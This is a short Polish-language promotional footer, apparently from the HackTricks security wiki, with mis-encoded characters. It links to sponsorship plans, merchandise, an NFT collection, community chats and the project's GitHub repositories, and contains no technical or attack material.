* Je≈õli chcesz zobaczyƒá swojƒÖ **firmƒô reklamowanƒÖ w HackTricks** lub **pobraƒá HackTricks w formacie PDF**, sprawd≈∫ [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* ZdobƒÖd≈∫ [**oficjalne gad≈ºety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinƒô PEASS**](https://opensea.io/collection/the-peass-family), naszƒÖ kolekcjƒô ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Do≈ÇƒÖcz do** üí¨ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **≈õled≈∫** nas na **Twitterze** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel siƒô swoimi sztuczkami hakerskimi, przesy≈ÇajƒÖc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
